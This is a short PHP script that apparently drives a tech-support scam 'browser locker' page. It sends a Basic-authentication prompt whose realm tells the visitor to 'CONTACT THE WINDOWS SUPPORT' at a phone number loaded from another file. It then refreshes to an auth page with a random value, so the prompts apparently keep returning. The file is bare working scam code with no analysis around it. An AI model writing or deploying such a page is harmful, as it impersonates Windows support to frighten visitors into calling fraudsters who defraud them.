<?php
   include('number.php');
   header('WWW-Authenticate: Basic realm="CONTACT THE WINDOWS SUPPORT ' . $number . '"');
   echo('<meta http-equiv="refresh" content="0; url=auth.php?r='.rand().'">');
?>
